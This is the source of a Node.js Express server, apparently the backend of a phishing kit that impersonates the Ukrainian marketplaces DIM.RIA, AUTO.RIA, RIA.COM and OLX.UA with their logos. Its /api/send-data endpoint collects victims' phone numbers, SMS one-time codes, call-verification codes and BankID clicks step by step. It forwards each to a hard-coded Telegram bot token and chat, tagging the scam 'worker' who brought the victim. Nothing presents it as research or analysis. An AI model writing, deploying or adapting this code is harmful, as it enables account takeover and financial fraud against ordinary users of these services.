const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ЛОГОТИПИ ТА НАЗВИ ПРОЕКТІВ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA",
    autoria: "AUTO.RIA",
    ria: "RIA.COM",
    olx: "OLX.UA"
};

// === МАРШРУТИЗАЦІЯ ===

app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// === ФУНКЦІЯ ВІДПРАВКИ В TELEGRAM ===

async function sendToTelegram(message) {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                timeout: 10000
            });
            const result = await res.json();
            if (res.ok && result.ok) return true;
            console.error('Telegram error:', result);
            if (result.error_code === 403) return false;
        } catch (err) {
            console.error(`Попытка ${i + 1}:`, err.message);
            if (i === 2) return false;
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    return false;
}

// === API ДЛЯ ВІДПРАВКИ ДАНИХ ===

app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, callCode, method, worker, project = 'dimria', city = 'Невідомо' } = req.body;

    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
    let message = '';
    
    const isPhoneStep = step === 'phone';
    const isCodeStep = step === 'code';
    const isCallStep = step === 'call';
    const isMethodSelectStep = step === 'method_select';
    const isBankIDStep = step === 'bankid';


    if (isPhoneStep && phone) {
        // Крок 1: Введення телефону
        message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    } 
    else if (isMethodSelectStep && method && phone) {
        // Крок 3: Вибір методу підтвердження
        const methodEmoji = method === 'sms' ? '💬' : method === 'call' ? '📞' : '💳';
        const methodText = method === 'sms' ? 'SMS' : method === 'call' ? 'ДЗВІНОК (4 ЦИФРИ)' : 'BankID (Помилка)';
        
        message = `*-- ВИБІР МЕТОДУ --* ${methodEmoji}\n*Проект:* ${projectName}\n*Номер:* \`${phone}\`\n*Метод:* *${methodText}*`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    }
    else if (isCodeStep && code && phone) {
        // Крок 4: Введення SMS-коду
        message = `*SMS КОД:* \`${code}\` ✅\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    }
    else if (isCallStep && callCode && phone) {
        // Крок 5: Введення 4 цифр дзвінка
        message = `*КОД ДЗВІНКА:* \`${callCode}\` 📞✅\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    }
    else if (isBankIDStep && phone) {
        // Крок 6: Натиснута кнопка BankID (перед перенаправленням)
        message = `*BankID-КНОПКА НАТИСНУТА* ⚠️\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    }
    else {
        return res.status(400).json({ success: false, reason: 'Invalid step or missing data' });
    }

    const ok = await sendToTelegram(message);
    res.json({ success: ok });
});

// === ЗАПУСК СЕРВЕРА ===

app.listen(PORT, () => {
    console.log(`Сервер: http://localhost:${PORT}`);
    console.log(`Панель: http://localhost:${PORT}/panel`);
    setTimeout(() => {
        sendToTelegram(`*Проекты успешно стали на сервер* ✅\nНаши проекты: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
    }, 3000);
});
